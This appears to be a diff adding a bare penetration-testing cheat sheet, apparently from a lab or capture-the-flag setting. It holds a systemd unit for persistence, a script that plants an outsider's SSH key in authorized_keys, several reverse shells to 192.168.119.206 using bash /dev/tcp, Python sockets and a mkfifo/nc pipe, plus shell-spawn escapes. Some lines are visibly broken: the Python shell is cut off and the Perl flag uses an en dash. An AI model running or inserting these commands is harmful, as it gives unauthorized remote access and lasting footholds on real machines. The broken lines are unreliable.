@@ -1,0 +1,23 @@
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "/home/pepper/yplease.sh"
+[Install]
+WantedBy=multi-user.target' > /home/pepper/run.service
+
+#!/bin/bash
+touch /tmp/test.txt
+mkdir ~/.ssh/
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCluP2TM1xPYx3uKdxA0SNw5RC8UZQ3h5bIMB62E9ThBAxmeRCOQwTGQ9bo+UvZjfPq+/hUqkJKCJg/Vl4non1+51Fi+0poC6lraEAFHfEDJMMGRr+f9eGHHuEqG5WQpW+MZSNXSdANUmufecoVSbDqyWhy3iOFEvNiM35sIWL60qyhj36tIM36usOiGXDYNmWGcv0x31YkkKdB0Y/4biW40BKHaY0mrE0V1aLvTt7z5trYYepJtOBo44gMteqNIESemjUzaCLtqvy5/VfNuqyOxsAbDg7tezf7ka6i3cXxXFevt9d2finMGPb9Sf6t36FE8CFrknLNwNm5Ak4vO4/Z7QPvrkvOEzPckMzqi03LiM8U/7Yw7QcGkA/TGhl2lN5+HWmhAJ2FhBuC3qUPK6Xy5z4HaFMrdh2D97nGLsFhMwiN4TuvZ8fnMOj9R6lOVefTGM/UuoQ2kFNWsszZCceUPDrqpLM9pVI4nN8USvOWQ3GZS+yQ8MMBKVIvKDpN35E= themanwhois@themanwhois' >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+ed20b785808f615be2c588ed925b18ce    
+
+bash -i >& /dev/tcp/192.168.119.206/8443 0>&1
+
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.206",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+echo os.system("/bin/bash")
+perl —e 'exec "/bin/sh";'
+
+rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 192.168.119.206 443 > /tmp/f
